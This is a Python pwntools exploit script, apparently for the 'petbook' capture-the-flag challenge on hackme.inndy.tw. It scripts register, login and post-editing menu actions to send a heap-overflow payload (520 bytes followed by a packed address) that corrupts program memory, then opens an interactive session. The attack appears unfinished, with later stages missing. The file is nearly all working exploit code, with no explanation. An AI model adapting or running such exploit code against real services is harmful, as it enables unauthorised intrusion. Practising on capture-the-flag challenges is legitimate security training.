#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./petbook"
libcPath = "libc-2.23.so.x86_64"
remoteAddr = "hackme.inndy.tw"
#  remoteAddr = "localhost"
remotePort = 7710
#  remotePort = 9999

context.binary = elfPath
context.noptrace = True
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    context.noptrace = True if len(sys.argv) == 2 else False
    io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    if libcPath:
        libc = ELF(libcPath)

else:
    context.log_level = "info"
    io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def register(name, pwd):
    io.sendlineafter(">>\n", "1")
    io.sendlineafter(">>\n", name)
    io.sendlineafter(">>\n", pwd)

def login(name, pwd):
    io.sendlineafter(">>\n", "2")
    io.sendlineafter(">>\n", name)
    io.sendlineafter(">>\n", pwd)

def newPost(title, length, cont):
    io.sendlineafter(">>\n", "1")
    io.sendlineafter(">>\n", title)
    io.sendlineafter(">>\n", str(length))
    io.sendlineafter(">>\n", cont)

def viewPost():
    io.sendlineafter(">>\n", "2")

def editPost(idx, title, length, cont):
    io.sendlineafter(">>\n", "3")
    io.sendlineafter(">>\n", str(idx))
    io.sendlineafter(">>\n", title)
    io.sendlineafter(">>\n", str(length))
    io.sendlineafter(">>\n", cont)

def logout():
    io.sendlineafter(">>\n", "0")

if __name__ == "__main__":
    register("M4x", "123456")
    login("M4x", "123456")
    newPost("M4x's post", 0x228, 'a' * 520 + p64(0x603158 - 0x10))
    editPost(0, "M4x's post", 0x238, "aaaa")
    logout()

    register("abo", "abcdefg")
    login("abo", "abcdefg")

    
    io.interactive()
    io.close()


